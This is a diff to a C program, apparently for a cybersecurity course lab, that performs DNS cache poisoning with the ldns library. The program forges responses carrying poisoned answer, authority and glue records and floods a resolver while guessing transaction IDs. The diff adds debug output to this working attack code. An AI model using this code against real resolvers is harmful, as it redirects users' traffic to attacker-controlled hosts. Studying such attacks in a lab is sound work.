@@ -500,6 +500,8 @@ static int build_spoofed_response(const char *qname,
     ldns_status status;
     int ret = -1;
 
+    printf("[DEBUG] Building spoofed response for qname=%s, txid=%u\n", qname, txid_guess);
+
     // Create new DNS packet
     response = ldns_pkt_new();
     if (!response) {
@@ -532,6 +534,7 @@ static int build_spoofed_response(const char *qname,
 
     // Answer section: Directly answer the query with poisoned IP
     // This caches the A record for the queried subdomain (e.g., ww0.example1...)
+    printf("[DEBUG] Adding ANSWER: %s A 1.2.3.4\n", qname);
     ldns_rr *answer_rr = ldns_rr_new();
     ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
     ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
@@ -542,6 +545,7 @@ static int build_spoofed_response(const char *qname,
 
     // Authority section: Claim example1.cybercourse.example.com delegates to www.example1...
     // This matches the course example pattern (zone NS target)
+    printf("[DEBUG] Adding AUTHORITY: example1.cybercourse.example.com NS www.example1.cybercourse.example.com\n");
     authority_rr = ldns_rr_new();
     ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("example1.cybercourse.example.com"));
     ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
@@ -552,6 +556,7 @@ static int build_spoofed_response(const char *qname,
 
     // Additional section: Glue record for the NS (THE POISON!)
     // This makes www.example1.cybercourse.example.com resolve to 6.6.6.6
+    printf("[DEBUG] Adding ADDITIONAL: www.example1.cybercourse.example.com A 6.6.6.6\n");
     additional_rr = ldns_rr_new();
     ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
     ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
@@ -568,6 +573,7 @@ static int build_spoofed_response(const char *qname,
         goto cleanup;
     }
 
+    printf("[DEBUG] Spoofed response serialized: %zu bytes\n", *out_len);
     ret = 0;
 
 cleanup:
@@ -670,6 +676,7 @@ static void perform_attack_round(int round)
     /* Step 2: flood with spoofed answers trying different TXIDs */
     printf("[Round %d] Flooding with up to %d spoofed responses...\n",
            round, MAX_SPOOFED_PKTS);
+    printf("[DEBUG] Query domain: %s, Resolver port: %u\n", subdomain, g_resolver_src_port);
 
     uint8_t *spoofed_dns = NULL;
     size_t spoofed_len = 0;
@@ -699,12 +706,15 @@ static void perform_attack_round(int round)
 
         // Optional: Print progress every 10000 packets
         if ((i + 1) % 10000 == 0) {
-            printf("  Sent %u/%d packets...\n", i + 1, MAX_SPOOFED_PKTS);
+            printf("  Sent %u/%d packets (TXID range: %u-%u)...\n", 
+                   i + 1, MAX_SPOOFED_PKTS, 
+                   (i + 1 - 10000) % 65536, (i + 1) % 65536);
         }
     }
 
     printf("[Round %d] Injection complete: %d/%d packets sent successfully\n",
            round, successful_injections, MAX_SPOOFED_PKTS);
+    printf("[DEBUG] Attempted TXID range: 0-%u (cycling through 65536)\n", MAX_SPOOFED_PKTS % 65536);
 }
 
 /**
@@ -795,6 +805,13 @@ static int check_poisoning(void)
         goto cleanup;
     }
 
+    printf("[DEBUG] Checking poisoning for %s...\n", test_domain);
+    printf("[DEBUG] Response received: %zd bytes\n", recv_len);
+    printf("[DEBUG] Response RCODE: %d\n", ldns_pkt_get_rcode(response));
+    printf("[DEBUG] Answer count: %zu\n", ldns_pkt_ancount(response));
+    printf("[DEBUG] Authority count: %zu\n", ldns_pkt_nscount(response));
+    printf("[DEBUG] Additional count: %zu\n", ldns_pkt_arcount(response));
+
     // Check answer section for A record pointing to 6.6.6.6
     ldns_rr_list *answer = ldns_pkt_answer(response);
     if (answer) {
@@ -805,6 +822,7 @@ static int check_poisoning(void)
                 if (a_rdf) {
                     char *ip_str = ldns_rdf2str(a_rdf);
                     if (ip_str) {
+                        printf("[DEBUG] Found A record: %s\n", ip_str);
                         // Compare IP (strip trailing dot/whitespace if present)
                         if (strncmp(ip_str, poison_ip, strlen(poison_ip)) == 0) {
                             printf("\n✓ Cache poisoning SUCCESS! %s resolves to %s\n",
@@ -812,10 +830,28 @@ static int check_poisoning(void)
                             poisoned = 1;
                             free(ip_str);
                             break;
+                        } else {
+                            printf("[DEBUG] IP mismatch: expected %s, got %s\n", poison_ip, ip_str);
                         }
                         free(ip_str);
                     }
                 }
+            }
+        }
+    } else {
+        printf("[DEBUG] No answer section in response\n");
+    }
+
+    // Also check authority section
+    ldns_rr_list *authority = ldns_pkt_authority(response);
+    if (authority && ldns_rr_list_rr_count(authority) > 0) {
+        printf("[DEBUG] Authority section has %zu records:\n", ldns_rr_list_rr_count(authority));
+        for (size_t i = 0; i < ldns_rr_list_rr_count(authority); i++) {
+            ldns_rr *rr = ldns_rr_list_rr(authority, i);
+            char *rr_str = ldns_rr2str(rr);
+            if (rr_str) {
+                printf("[DEBUG]   %s", rr_str);
+                free(rr_str);
             }
         }
     }
